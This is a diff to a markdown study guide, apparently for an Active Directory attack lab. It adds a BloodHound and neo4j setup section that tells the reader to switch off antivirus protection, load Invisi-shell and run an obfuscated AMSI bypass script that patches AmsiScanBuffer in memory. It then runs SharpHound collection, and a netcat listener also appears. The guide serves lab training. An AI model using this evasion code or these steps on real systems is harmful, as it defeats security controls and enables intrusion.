@@ -284,8 +284,6 @@ Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
 
 
 
-
-
 # **Local Privilege Escalation**
 
 
@@ -413,6 +411,145 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 
 
 ![](https://i.imgur.com/Hf381f0.png)
+
+
+
+
+
+### **Enumeration - Bloodhound**
+
+
+
+**The Reason why this enumeration is coming after Local Privilege Escalation is because we need some administrative rights to run this type of enumeration**
+
+
+#### **BloodHound New Setup**
+
+- BloodHound uses **neo4j** graph database, so we need to setup that first.
+- Go ahead open this location on MS-DOS
+
+
+```powershell
+cd C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin
+```
+
+
+- Install and start the neo4j service as follows:
+
+
+```powershell
+.\neo4j.bat install-service
+.\neo4j.bat start
+```
+
+
+- Browse to the **neo4j** service on `localhost:7474/browser/` on your browser
+- Enter the username: **neo4j** and password: **neo4j**.
+- You also need to enter a new password. Let's use BloodHound as the new password.
+- We also need to power on bloodhound, change directory to :
+
+
+```powershell
+cd C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
+.\BloodHound.exe
+```
+
+
+
+- Provide **neo4j** username and password we crated earlier
+
+
+```
+bolt://localhost:7687
+
+Username: neo4j
+Password:bloodhound 
+```
+
+
+- Now since we have local administrator privileges, go ahead and turn off antivirus (Both **Real time protection** and **Tamper Protection**) using GUI
+- Open another powershell session with local administrative privileges and load **Invisi-shell**
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
+cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
+```
+
+- Bypass  **.NET AMSI Bypass** with the script below :
+
+```powershell
+$ZQCUW = @"
+using System;
+using System.Runtime.InteropServices;
+public class ZQCUW {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string
+procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
+dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $ZQCUW
+$BBWHVWQ =
+[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
+;&#105;&#46;&#100;&#108;&#108;'))")
+$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
+"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
+;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
+$p = 0
+[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
+$TLML = "0xB8"
+$PURX = "0x57"
+$YNWL = "0x00"
+$RTGX = "0x07"
+$XVON = "0x80"
+$WRUD = "0xC3"
+$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
+[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
+```
+
+
+- Start BloodHound collector, to gather data
+
+
+```powershell
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Verbose
+```
+
+
+
+- Navigate to the bloodhound collector directory on the GUI
+
+```
+Location:
+
+C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
+```
+
+
+
+- You should see a zip file, drag and drop it to bloodhound UI
+
+
+![](https://i.imgur.com/9Wd253Y.png)
+
+
+
+
+
+#### **BloodHound Old Setup**
+
+
+
+
+
+
+
 
 
 
